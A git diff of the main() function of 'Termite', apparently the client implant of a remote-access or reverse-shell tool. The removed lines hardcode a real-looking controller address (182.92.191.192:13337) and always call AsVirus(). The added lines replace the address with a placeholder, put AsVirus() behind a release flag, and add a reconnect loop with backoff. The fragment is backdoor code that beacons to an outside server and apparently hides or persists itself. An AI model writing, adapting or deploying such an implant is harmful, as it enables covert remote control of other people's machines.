@@ -721,23 +721,24 @@ func main() {
 	processes = map[string]*TermiteProcess{}
 	pullTunnels = map[string]*net.Conn{}
 	pushTunnels = map[string]*net.Conn{}
-	// service := "127.0.0.1:13337"
-	service := "182.92.191.192:13337"
-	// release := true
+	service := "127.0.0.1:13337"
+	release := true
 
-	// if release {
-	// 	service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
-	// 	AsVirus()
-	// }
-	AsVirus()
+	if release {
+		service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
+	}
 
 	for {
 		log.Info("Termite (v%s) starting...", update.Version)
-		if !StartClient(service) {
+		if StartClient(service) {
+			if release {
+				AsVirus()
+			}
+			add := (int64(rand.Uint64()) % backoff.Current)
+			log.Error("Connect to server failed, sleeping for %d seconds", backoff.Current+add)
+			backoff.Sleep(add)
+		} else {
 			break
 		}
-		add := (int64(rand.Uint64()) % backoff.Current)
-		log.Error("Connect to server failed, sleeping for %d seconds", backoff.Current+add)
-		backoff.Sleep(add)
 	}
 }
